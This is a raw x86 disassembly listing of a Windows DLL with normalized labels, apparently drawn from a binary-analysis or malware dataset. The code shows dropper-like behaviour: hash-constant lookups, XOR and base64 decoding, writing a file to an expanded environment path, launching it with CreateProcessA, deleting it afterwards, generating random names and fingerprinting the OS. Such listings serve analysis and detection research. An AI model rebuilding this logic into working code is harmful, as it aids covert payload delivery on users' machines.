leave
retn
sub_100037f4
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
push 0x5
call sub_10003453
mov esi eax
xor edi edi
pop ecx
mov [ ebp - 0x8 ] esi
cmp esi edi
je r-xdata
push [ ebp - 0x8 ]
call sub_100021d8
pop ecx
mov eax edi
pop edi
pop esi
leave
retn
call sub_100034a0
mov [ ebp - 0x4 ] eax
cmp [ esi ] edi
jne r-xdata
cmp [ esi + 0x38 ] di
je r-xdata
add esi [ esi ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x50 ]
jne r-xdata
jmp r-xdata
push 0x1
push edi
push [ esi + 0x3c ]
call sub_1000320e
add esp 0xc
cmp eax [ ebp + 0x8 ]
je r-xdata
mov edi [ esi + 0x44 ]
sub_10003851
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
push esi
mov esi [ ebx + 0x8 ]
test esi esi
je r-xdata
pop esi
push edi
xor edi edi
test esi esi
je r-xdata
pop edi
push edi
mov ecx ebx
call sub_10003715
push eax
call sub_100034b2
pop ecx
test al al
je r-xdata
inc edi
cmp edi esi
jb r-xdata
push edi
mov ecx ebx
call sub_10003715
push eax
call sub_10001b54
sub_10003896
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
push 0x0
push 0x400
call sub_10001c80
mov esi eax
push esi
call sub_10003780
push esi
mov bl al
call sub_10001acc
add esp 0x14
pop esi
mov al bl
pop ebx
pop ebp
retn
sub_100038c3
push ebp
mov ebp esp
sub esp 0xc
push esi
push 0xc
call sub_100021c0
push 0x5
mov [ ebp - 0x4 ] eax
call sub_10003453
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0xc ] esi
test esi esi
je r-xdata
push [ ebp - 0xc ]
call sub_100021d8
mov eax [ ebp - 0x4 ]
pop ecx
pop esi
leave
retn
call sub_100034a0
push ebx
mov [ ebp - 0x8 ] eax
push edi
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
add esi [ esi ]
mov eax [ ebp - 0x8 ]
cmp eax [ esi + 0x50 ]
jne r-xdata
pop edi
pop ebx
push 0x10
call sub_1000461b
mov edi eax
movzx eax [ esi + 0x38 ]
add eax 0x2
push eax
call sub_100021c0
mov ebx eax
movzx eax [ esi + 0x38 ]
push eax
push [ esi + 0x3c ]
push ebx
call sub_100041e0
mov [ edi ] ebx
mov eax [ esi + 0x44 ]
mov [ edi + 0x4 ] eax
mov eax [ esi + 0x48 ]
push [ edi + 0x4 ]
mov [ edi + 0x8 ] eax
call sub_10003896
mov ecx [ ebp - 0x4 ]
add esp 0x18
test al al
setne al
push edi
mov [ edi + 0xc ] al
call sub_1000372e
push 0x1
push 0x0
push [ esi + 0x3c ]
call sub_1000320e
add esp 0xc
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub_1000397e
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push esi
push [ ebp + 0x8 ]
call sub_100038c3
and [ ebp - 0x4 ] 0x0
mov esi eax
mov eax [ esi + 0x8 ]
pop ecx
test eax eax
je r-xdata
mov ecx esi
call sub_100032b5
push esi
call sub_100021d8
mov eax [ ebp - 0x8 ]
pop ecx
pop esi
leave
retn
push ebx
push edi
push ebx
mov ecx esi
call sub_10003715
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
test eax eax
jne r-xdata
inc ebx
cmp ebx [ esi + 0x8 ]
jb r-xdata
pop edi
pop ebx
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x8 ]
jb r-xdata
push ebx
mov ecx esi
call sub_10003715
cmp edi [ eax + 0x8 ]
je r-xdata
jmp r-xdata
push [ ebp - 0x4 ]
mov ecx esi
call sub_10003715
mov edi [ eax + 0x4 ]
xor ebx ebx
sub_100039f7
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi 0x250dfa8f
test edi edi
je r-xdata
push esi
call sub_1000397e
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
pop edi
pop esi
pop ebp
retn
push esi
call sub_100037f4
pop ecx
test eax eax
jne r-xdata
mov esi 0x7712feae
test edi edi
je r-xdata
push esi
call sub_1000397e
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_100037f4
pop ecx
test eax eax
jne r-xdata
mov esi 0xbd3cc33a
test edi edi
je r-xdata
push esi
call sub_1000397e
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_100037f4
pop ecx
test eax eax
jne r-xdata
mov esi 0x7a38ebf3
test edi edi
je r-xdata
push esi
call sub_1000397e
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_100037f4
pop ecx
test eax eax
jne r-xdata
mov esi 0x4a36abf3
test edi edi
je r-xdata
push esi
call sub_1000397e
pop ecx
test eax eax
jne r-xdata
mov [ edi ] esi
push esi
call sub_100037f4
pop ecx
test eax eax
jne r-xdata
and [ edi ] eax
sub_10003ab2
push ebp
mov ebp esp
sub esp 0x288
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_10002ea0
cmp [ eax + edi - 0x1 ] 0x5c
pop ecx
mov esi r--data
je r-xdata
push edi
call sub_100030a4
pop ecx
push esi
push r--data
push edi
call sub_100030f9
add esp 0xc
jmp r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100030f9
push 0x13c
mov edi eax
lea eax [ ebp - 0x144 ]
push ebx
push eax
mov [ ebp - 0x148 ] ebx
call sub_10004208
add esp 0x18
lea eax [ ebp - 0x148 ]
push eax
push edi
call sub_10001cb2
xor ecx ecx
cmp eax 0xffffffff
setne cl
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ecx
call sub_100021d8
cmp [ ebp - 0x8 ] ebx
pop ecx
jmp r-xdata
push 0x13c
lea eax [ ebp - 0x284 ]
push ebx
push eax
mov [ ebp - 0x288 ] ebx
call sub_10004208
push esi
push r--data
push [ ebp + 0x8 ]
call sub_100030f9
mov edi eax
add esp 0x18
lea eax [ ebp - 0x288 ]
push eax
push edi
call sub_10001cb2
push edi
mov [ ebp - 0x4 ] eax
call sub_100021d8
cmp [ ebp - 0x4 ] 0xffffffff
pop ecx
jne r-xdata
xor ebx ebx
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0x18 ] bl
je r-xdata
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push 0xffffffff
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push [ ebp - 0x4 ]
test [ ebp - 0x288 ] 0x10
je r-xdata
push 0xc
call sub_10002296
pop ecx
cmp eax ebx
je r-xdata
call sub_10001ce4
push [ ebp + 0x8 ]
call sub_100021d8
pop ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] bl
je r-xdata
push 0xc
call sub_10002296
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
lea eax [ ebp - 0x25c ]
push r--data
push eax
call sub_1000305d
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
lea eax [ ebp - 0x11c ]
push r--data
push eax
call sub_1000305d
pop ecx
pop ecx
test al al
jne r-xdata
test [ ebp - 0x148 ] 0x10
jne r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
lea eax [ ebp - 0x288 ]
push eax
push [ ebp - 0x4 ]
call sub_10001ccb
test eax eax
jne r-xdata
lea eax [ ebp - 0x25c ]
push r--data
push eax
call sub_1000305d
pop ecx
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x148 ]
push eax
push [ ebp - 0x4 ]
call sub_10001ccb
test eax eax
lea eax [ ebp - 0x11c ]
push r--data
push eax
call sub_1000305d
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x4 ]
call sub_10001ce4
push esi
push r--data
lea eax [ ebp - 0x25c ]
push eax
push [ ebp + 0x8 ]
call sub_100030f9
add esp 0x10
mov edi eax
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
test [ ebp - 0x148 ] eax
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0xc
call sub_10002296
pop ecx
cmp eax ebx
je r-xdata
push esi
lea eax [ ebp - 0x11c ]
push eax
push [ ebp + 0x8 ]
call sub_100030f9
mov ecx [ ebp + 0x14 ]
add esp 0xc
mov edi eax
push edi
call sub_10003184
push edi
call sub_100021d8
pop ecx
push 0x1
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10003ab2
push edi
call sub_100021d8
add esp 0x18
push r--data
push [ ebp + 0xc ]
call sub_1000305d
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp + 0x14 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
push edi
call sub_10003184
sub_10003d5d
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
mov [ ebp - 0xc ] ecx
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax ecx
leave
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
inc ecx
mov [ ebp - 0xc ] ecx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0xc ]
add ecx eax
mov dl [ ecx ]
mov al [ esi ]
and [ ebp - 0x8 ] 0x0
test al al
je r-xdata
pop esi
mov al [ ebp - 0xc ]
imul [ ebp - 0x8 ]
add al [ ebp - 0x1 ]
xor dl al
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ ecx ] dl
mov al [ eax + esi ]
mov [ ebp - 0x1 ] al
test al al
jne r-xdata
sub_10003db4
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ CryptBinaryToStringA@IAT ]
push edi
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
push [ ebp - 0x4 ]
call sub_10004653
pop ecx
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov eax edi
pop edi
pop esi
leave
retn 0x8
sub_10003df6
push ebp
mov ebp esp
push ebx
push esi
mov esi [ CryptStringToBinaryA@IAT ]
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
push ebx
push ebx
push edi
push ebx
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov eax [ edi ]
mov [ ebp + 0x10 ] ebx
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push eax
call sub_10004653
pop ecx
push ebx
push ebx
push edi
push eax
push 0x1
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
push [ ebp + 0x8 ]
call esi
sub_10003e40
push esi
push 0x4
mov esi ecx
call sub_1000461b
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10004538
jmp r-xdata
xor eax eax
mov ecx eax
call sub_10004715
jmp r-xdata
push 0x1
mov [ esi + 0x8 ] eax
call sub_1000461b
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10004715
jmp r-xdata
push 0x1
mov [ esi ] eax
call sub_1000461b
pop ecx
test eax eax
je r-xdata
mov [ esi + 0x4 ] eax
mov eax esi
pop esi
retn
sub_10003e94
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0xffffffff
mov [ ebp - 0xc ] ecx
mov ecx [ ecx + 0x8 ]
push 0x1010101
call sub_10004544
mov edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
xor eax 0xaa7d756
cmp [ ebp + 0x10 ] 0x0
mov [ ebp - 0x4 ] eax
mov ebx edi
push edi
je r-xdata
call sub_10004653
push edi
push [ ebp + 0x8 ]
mov esi eax
push esi
call sub_100041e0
add esp 0x10
push [ ebp + 0x8 ]
call sub_100040db
movzx eax ax
lea ebx [ edi + 0x2 ]
push ebx
mov [ ebp + 0x10 ] eax
call sub_10004653
mov esi eax
push 0x2
lea eax [ ebp + 0x10 ]
push eax
push esi
call sub_100041e0
push edi
push [ ebp + 0x8 ]
lea eax [ esi + 0x2 ]
push eax
call sub_100041e0
add esp 0x24
jmp r-xdata
lea eax [ ebx + 0x4 ]
push eax
mov [ ebp + 0x8 ] eax
call sub_10004653
mov edi eax
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push edi
call sub_100041e0
push ebx
lea eax [ edi + 0x4 ]
push esi
push eax
call sub_100041e0
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
add esp 0x1c
push [ ebp + 0x8 ]
push edi
call sub_10003db4
push edi
mov ebx eax
call sub_1000465c
push esi
call sub_1000465c
pop ecx
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0xc
mov ecx eax
and ecx 0x3
mov cl [ ebp + ecx - 0x4 ]
xor [ eax + esi ] cl
inc eax
cmp eax ebx
jb r-xdata
xor eax eax
test ebx ebx
je r-xdata
sub_10003f77
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ecx ]
push ebx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
xor ebx ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
call sub_10003df6
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
mov eax ebx
pop ebx
leave
retn 0xc
push esi
push edi
push 0x4
push eax
lea eax [ ebp + 0xc ]
push eax
mov [ ebp + 0xc ] ebx
call sub_100041e0
mov esi [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
xor eax 0xaa7d756
add esi 0xfffffffc
push esi
mov [ ebp - 0xc ] eax
call sub_10004653
mov edi eax
add esp 0x10
xor eax eax
test esi esi
je r-xdata
and [ ebp + 0x8 ] ebx
push 0x2
lea eax [ ebp + 0x8 ]
push edi
push eax
call sub_100041e0
mov eax [ ebp + 0x10 ]
add esi 0xfffffffe
mov [ eax ] esi
lea eax [ esi + 0x1 ]
push eax
call sub_10004653
mov ebx eax
push esi
lea eax [ edi + 0x2 ]
push eax
push ebx
call sub_100041e0
push esi
push ebx
push [ ebp + 0x8 ]
call sub_10004127
add esp 0x28
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx eax
and ecx 0x3
mov cl [ ebp + ecx - 0xc ]
xor cl [ edx + eax + 0x4 ]
mov [ eax + edi ] cl
inc eax
cmp eax esi
jb r-xdata
push edi
call sub_1000465c
push [ ebp - 0x8 ]
call sub_1000465c
pop ecx
pop ecx
pop edi
pop esi
push ebx
call sub_1000465c
pop ecx
xor ebx ebx
sub_1000404a
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0xc ]
lea eax [ edi + 0x1 ]
push eax
call sub_10004653
xor esi esi
pop ecx
mov [ ebp - 0x4 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
leave
retn 0x8
mov edi [ ebp + 0x8 ]
sub edi eax
push ebx
mov eax [ ebp - 0x4 ]
lea ecx [ esi + eax ]
xor edx edx
push 0xb
mov eax esi
pop ebx
div ebx
mov al [ edx + r--data ]
xor al [ edi + ecx ]
inc esi
mov [ ecx ] al
cmp esi [ ebp + 0xc ]
jl r-xdata
pop ebx
sub_10004096
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov ecx edi
call sub_10003db3
push edi
call sub_10004632
pop ecx
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
mov ecx edi
call sub_10003db3
push edi
call sub_10004632
pop ecx
pop edi
pop esi
retn
mov ecx esi
call sub_1000449d
push esi
call sub_10004632
pop ecx
sub_100040db
push ebp
mov ebp esp
push ecx
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] ecx
jbe r-xdata
mov ax [ ebp - 0x4 ]
leave
retn
push esi
shr [ ebp - 0x4 ] 0x1
mov edx 0x2042
xor dx [ ebp - 0x4 ]
shr dx 0x1
movzx edx dx
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dl al
xor dl [ ebp - 0x4 ]
test dl 0x1
je r-xdata
inc ecx
cmp ecx [ ebp + 0xc ]
jb r-xdata
shr al 0x1
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ ecx + eax ]
push 0x8
pop esi
pop esi
sub_10004127
push ebp
mov ebp esp
push ebx
push [ ebp + 0x10 ]
xor bl bl
push [ ebp + 0xc ]
call sub_100040db
pop ecx
pop ecx
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov al bl
pop ebx
pop ebp
retn
inc bl
sub_10004147
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl [ ebp + 0xc ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl dl
je r-xdata
pop ebp
retn
inc eax
xor eax eax
sub_10004165
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0xc ]
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
cmp [ eax ] dx
je r-xdata
pop ebp
retn
add eax 0x2
xor eax eax
sub_1000418a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
cmp [ esi ] 0x0
mov [ ebp + 0x8 ] eax
je r-xdata
pop esi
pop ebp
retn
mov dl [ eax ]
push edi
test dl dl
je r-xdata
xor eax eax
sub eax esi
cmp [ ecx ] 0x0
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx ]
inc eax
test dl dl
jne r-xdata
movsx edi [ eax + ecx ]
movsx edx dl
sub edi edx
jne r-xdata
pop edi
mov ecx esi
test dl dl
je r-xdata
inc ecx
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_100041e0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
sub ecx eax
mov dl [ eax ]
dec [ ebp + 0x10 ]
mov [ ecx + eax ] dl
inc eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
sub_10004208
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
movzx eax [ ebp + 0xc ]
imul eax eax 0x1010101
mov edx ecx
push ebx
push edi
mov edi [ ebp + 0x8 ]
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop ebx
sub_10004236
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call [ DeleteFileA@IAT ]
push esi
call sub_1000465c
pop ecx
xor eax eax
pop esi
pop ebp
retn 0x4
push 0xffffffff
push eax
call sub_10001be9
sub_10004263
push ebx
push esi
push 0xc
mov esi ecx
call sub_1000461b
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx eax
call sub_10003e40
jmp r-xdata
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] bx
mov eax esi
pop esi
pop ebx
retn
sub_100042a6
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ExpandEnvironmentStringsA@IAT ]
push edi
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov edi ecx
call esi
mov ebx eax
push ebx
call sub_10004653
pop ecx
push ebx
push eax
push [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_100042e9
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor ebx ebx
mov esi ecx
push ebx
push [ esi + 0x8 ]
call [ CreateDirectoryA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0x3
je r-xdata
pop esi
pop ebx
leave
retn 0x8
push edi
mov edi 0x401
push edi
call sub_10004653
push [ esi + 0x4 ]
mov [ ebp - 0x4 ] eax
push [ esi + 0x8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x14
push ebx
push ebx
push 0x2
push ebx
push 0x2
push 0x40000000
push [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
call [ CreateFileA@IAT ]
mov [ ebp - 0xc ] eax
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
call sub_1000465c
pop ecx
pop edi
push ebx
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
push [ ebp + 0x8 ]
push eax
call [ WriteFile@IAT ]
push [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
call [ CloseHandle@IAT ]
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0x44
call sub_1000461b
push 0x10
mov [ ebp + 0x8 ] eax
mov [ eax ] 0x44
mov [ eax + 0x2c ] 0x1
call sub_1000461b
pop ecx
pop ecx
mov [ ebp + 0xc ] eax
cmp [ esi + 0x10 ] bl
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
push eax
push [ ebp + 0x8 ]
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp - 0x4 ]
call [ CreateProcessA@IAT ]
jmp r-xdata
cmp [ esi + 0x11 ] bl
je r-xdata
push edi
call sub_10004653
pop ecx
mov ecx [ esi ]
push 0xc
push r--data
mov edi eax
call sub_1000404a
push [ esi + 0xc ]
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
push eax
push r--data
push edi
call sub_10001e9d
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push edi
push ebx
call sub_10001c15
push [ ebp - 0xc ]
call sub_1000465c
add esp 0x40
push edi
call sub_1000465c
pop ecx
push [ ebp + 0xc ]
call sub_10004632
push [ ebp + 0x8 ]
call sub_10004632
pop ecx
pop ecx
mov edi [ ebp - 0x10 ]
lea eax [ edi + 0x11 ]
push eax
call sub_10004653
push 0x10
push [ ebp + 0xc ]
mov esi eax
push esi
call sub_100041e0
push edi
push [ ebp - 0x4 ]
lea eax [ esi + 0x10 ]
push eax
call sub_100041e0
add esp 0x1c
push ebx
push ebx
push esi
push sub_10004236
push ebx
push ebx
call sub_10001c4a
sub_10004473
push esi
mov esi ecx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
push [ esi + 0x8 ]
call sub_1000465c
pop ecx
pop edi
mov [ esi + 0x10 ] 0x0
pop esi
retn
mov ecx edi
call sub_10004096
push edi
call sub_10004632
pop ecx
sub_100044a6
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x0
call esi
lea eax [ ebp - 0x8 ]
push eax
call [ QueryPerformanceCounter@IAT ]
push 0x0
call esi
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov edi [ ebp - 0x8 ]
mov ebx [ ebp - 0x10 ]
xor edi [ ebp - 0x4 ]
xor ebx [ ebp - 0xc ]
push 0x0
call esi
call [ GetTickCount@IAT ]
xor eax ebx
xor eax edi
pop edi
pop esi
pop ebx
leave
retn
sub_100044f0
push esi
push 0x3e
mov esi ecx
call sub_10004653
mov [ esi ] eax
pop ecx
mov al 0x30
mov edx [ esi ]
lea ecx [ eax - 0x30 ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x3a
jl r-xdata
mov al 0x41
mov edx [ esi ]
lea ecx [ eax - 0x37 ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x5b
jl r-xdata
mov al 0x61
mov edx [ esi ]
lea ecx [ eax - 0x3d ]
movsx ecx cl
mov [ ecx + edx ] al
inc al
cmp al 0x7b
jl r-xdata
pop esi
retn
sub_10004560
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea eax [ ebx + 0x1 ]
push eax
mov edi ecx
call sub_10004653
xor esi esi
pop ecx
mov [ ebp + 0x8 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx edi
call sub_100044a6
xor edx edx
push 0x3e
pop ecx
div ecx
mov eax [ edi ]
mov ecx [ ebp + 0x8 ]
mov al [ edx + eax ]
mov [ esi + ecx ] al
inc esi
cmp esi ebx
jb r-xdata
sub_100045a6
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov ebx ecx
push 0x1
call sub_10004544
mov ecx [ ebp + 0x8 ]
inc ecx
imul ecx eax
inc ecx
push ecx
mov [ ebp + 0xc ] eax
call sub_10004653
mov edi eax
mov eax [ ebp + 0xc ]
xor esi esi
pop ecx
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x8
mov [ ebp + 0xc ] eax
push [ ebp + 0x8 ]
mov ecx ebx
push 0x1
call sub_10004544
push eax
mov ecx ebx
call sub_10004560
push eax
mov [ ebp - 0x4 ] eax
lea eax [ esi + edi ]
push r--data
push eax
call [ wsprintfA@IAT ]
push [ ebp - 0x4 ]
add esi eax
call sub_1000465c
add esp 0x10
dec [ ebp + 0xc ]
jne r-xdata
sub_10004632
push ebp
mov ebp esp
call [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push eax
call [ HeapFree@IAT ]
sub_10004665
push ebp
mov ebp esp
sub esp 0x11c
push esi
push edi
xor esi esi
xor eax eax
push 0xfe
mov [ ebp - 0x108 ] ax
lea eax [ ebp - 0x106 ]
push esi
push eax
mov [ ebp - 0x11c ] 0x11c
mov [ ebp - 0x118 ] esi
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x110 ] esi
mov [ ebp - 0x10c ] esi
call sub_10004208
add esp 0xc
push 0x3
push 0x20
push 0x3
push 0x1
push 0x3
push 0x2
xor eax eax
push esi
push esi
mov esi [ VerSetConditionMask@IAT ]
mov [ ebp - 0x8 ] ax
mov [ ebp - 0x6 ] ax
lea edi [ ebp - 0x4 ]
stosd [ edi ]
call esi
push edx
push eax
call esi
push edx
push eax
call esi
movzx ecx [ ebp + 0x8 ]
mov [ ebp - 0x118 ] ecx
movzx ecx [ ebp + 0xc ]
push edx
push eax
mov [ ebp - 0x114 ] ecx
mov cx [ ebp + 0x10 ]
push 0x23
lea eax [ ebp - 0x11c ]
push eax
mov [ ebp - 0x8 ] cx
call [ VerifyVersionInfoW@IAT ]
neg eax
sbb eax eax
pop edi
neg eax
pop esi
leave
retn
sub_10004718
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
cmp [ ebp - 0x4 ] 0x0
mov al 0x20
je r-xdata
leave
retn
add al 0x20
sub_1000473d
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
push edi
mov edi 0x9c
push edi
call sub_1000461b
mov esi eax
pop ecx
push esi
mov [ esi ] edi
call [ GetVersionExA@IAT ]
lea eax [ ebp - 0x24 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ esi + 0x4 ]
xor ecx ecx
xor bl bl
sub eax 0x5
je r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
je r-xdata
dec eax
je r-xdata
mov bl 0x1
dec eax
je r-xdata
cmp [ esi + 0x9a ] 0x1
mov eax [ esi + 0x8 ]
jne r-xdata
sub eax 0x4
jne r-xdata
mov bl 0x2
jmp r-xdata
dec eax
jne r-xdata
sub eax ecx
je r-xdata
sub eax ecx
je r-xdata
push esi
call sub_10004632
pop ecx
pop edi
pop esi
mov al bl
pop ebx
leave
retn
cmp [ esi + 0x9a ] 0x1
sete bl
add bl 0xf
jmp r-xdata
cmp [ esi + 0x9a ] 0x1
jne r-xdata
mov bl 0xb
jmp r-xdata
dec eax
je r-xdata
mov bl 0x7
jmp r-xdata
dec eax
je r-xdata
mov eax 0x8000
test [ esi + 0x98 ] ax
je r-xdata
cmp [ ebp - 0x24 ] 0x9
jne r-xdata
mov bl 0xc
jmp r-xdata
dec eax
je r-xdata
mov bl 0x8
jmp r-xdata
dec eax
je r-xdata
mov edi [ GetSystemMetrics@IAT ]
push 0x59
call edi
test eax eax
jne r-xdata
mov bl 0x4
jmp r-xdata
mov bl 0x3
jmp r-xdata
mov bl 0xd
jmp r-xdata
dec eax
jne r-xdata
push ecx
push 0x3
push 0x6
mov bl 0x9
call sub_10004665
add esp 0xc
test al al
je r-xdata
dec eax
jne r-xdata
push 0x59
call edi
test eax eax
je r-xdata
mov bl 0x5
